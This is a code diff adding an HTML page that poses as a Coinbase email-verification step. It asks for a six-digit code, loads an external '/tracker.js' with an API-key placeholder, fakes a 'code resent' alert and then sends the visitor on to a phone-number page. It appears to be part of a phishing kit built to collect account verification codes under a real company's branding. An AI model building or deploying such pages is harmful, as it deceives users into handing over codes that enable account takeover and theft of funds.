@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email Verification - Coinbase</title>
+    <link rel="icon" type="image/svg+xml" href="assets/images/favicon.svg">
+    <link rel="stylesheet" href="styles.css">
+
+<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="logo-container">
+            <img src="assets/images/favicon.svg" alt="Coinbase" class="logo">
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="signup-container">
+            <!-- Email Icon -->
+            <div class="form-icon">
+                <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
+                    <circle cx="32" cy="32" r="32" fill="#5b8df5" opacity="0.15"/>
+                    <path d="M16 20h32c2.2 0 4 1.8 4 4v16c0 2.2-1.8 4-4 4H16c-2.2 0-4-1.8-4-4V24c0-2.2 1.8-4 4-4z" stroke="#5b8df5" stroke-width="2" fill="none"/>
+                    <path d="M12 24l20 12 20-12" stroke="#5b8df5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+                </svg>
+            </div>
+            
+            <h1 class="title">Verify your email</h1>
+            <p class="subtitle">We've sent a 6-digit code to your email. Enter it below to continue.</p>
+
+            <!-- Email Code Form -->
+            <form id="emailCodeForm" class="signup-form">
+                <div class="code-inputs">
+                    <input 
+                        type="text" 
+                        class="code-input" 
+                        id="code1"
+                        name="code1"
+                        maxlength="1"
+                        pattern="[0-9]"
+                        inputmode="numeric"
+                        autocomplete="off"
+                        required
+                    >
+                    <input 
+                        type="text" 
+                        class="code-input" 
+                        id="code2"
+                        name="code2"
+                        maxlength="1"
+                        pattern="[0-9]"
+                        inputmode="numeric"
+                        autocomplete="off"
+                        required
+                    >
+                    <input 
+                        type="text" 
+                        class="code-input" 
+                        id="code3"
+                        name="code3"
+                        maxlength="1"
+                        pattern="[0-9]"
+                        inputmode="numeric"
+                        autocomplete="off"
+                        required
+                    >
+                    <input 
+                        type="text" 
+                        class="code-input" 
+                        id="code4"
+                        name="code4"
+                        maxlength="1"
+                        pattern="[0-9]"
+                        inputmode="numeric"
+                        autocomplete="off"
+                        required
+                    >
+                    <input 
+                        type="text" 
+                        class="code-input" 
+                        id="code5"
+                        name="code5"
+                        maxlength="1"
+                        pattern="[0-9]"
+                        inputmode="numeric"
+                        autocomplete="off"
+                        required
+                    >
+                    <input 
+                        type="text" 
+                        class="code-input" 
+                        id="code6"
+                        name="code6"
+                        maxlength="1"
+                        pattern="[0-9]"
+                        inputmode="numeric"
+                        autocomplete="off"
+                        required
+                    >
+                </div>
+                <button type="submit" class="continue-btn">Verify</button>
+            </form>
+
+            <!-- Resend Link -->
+            <p class="signin-text">
+                Didn't receive the code? <a href="#" class="signin-link" id="resendCode">Resend</a>
+            </p>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <p class="footer-text">
+            For your security, never share this code with anyone.
+        </p>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const emailCodeForm = document.getElementById('emailCodeForm');
+            const codeInputs = document.querySelectorAll('.code-input');
+            const submitBtn = emailCodeForm.querySelector('.continue-btn');
+            const resendLink = document.getElementById('resendCode');
+            
+            // Auto-focus and navigation between inputs
+            codeInputs.forEach((input, index) => {
+                input.addEventListener('input', function(e) {
+                    const value = e.target.value;
+                    
+                    // Only allow numbers
+                    if (!/^\d*$/.test(value)) {
+                        e.target.value = '';
+                        return;
+                    }
+                    
+                    // Move to next input if filled
+                    if (value.length === 1 && index < codeInputs.length - 1) {
+                        codeInputs[index + 1].focus();
+                    }
+                    
+                    checkFormValidity();
+                });
+                
+                // Handle backspace
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                        codeInputs[index - 1].focus();
+                    }
+                });
+                
+                // Handle paste
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const pastedData = e.clipboardData.getData('text').slice(0, 6);
+                    const digits = pastedData.split('');
+                    
+                    digits.forEach((digit, i) => {
+                        if (i < codeInputs.length && /^\d$/.test(digit)) {
+                            codeInputs[i].value = digit;
+                        }
+                    });
+                    
+                    if (digits.length > 0) {
+                        const lastIndex = Math.min(digits.length - 1, codeInputs.length - 1);
+                        codeInputs[lastIndex].focus();
+                    }
+                    
+                    checkFormValidity();
+                });
+            });
+            
+            // Check if all code fields are filled
+            function checkFormValidity() {
+                let allFilled = true;
+                
+                codeInputs.forEach(input => {
+                    if (input.value.trim() === '') {
+                        allFilled = false;
+                    }
+                });
+                
+                if (allFilled) {
+                    submitBtn.classList.add('active');
+                } else {
+                    submitBtn.classList.remove('active');
+                }
+            }
+            
+            // Initial check and focus
+            checkFormValidity();
+            codeInputs[0].focus();
+            
+            // Handle form submission
+            emailCodeForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                window.location.href = 'phone-number.html';
+            });
+            
+            // Handle resend code
+            resendLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                alert('Verification code has been resent to your email.');
+            });
+        });
+    </script>
+</body>
+</html>
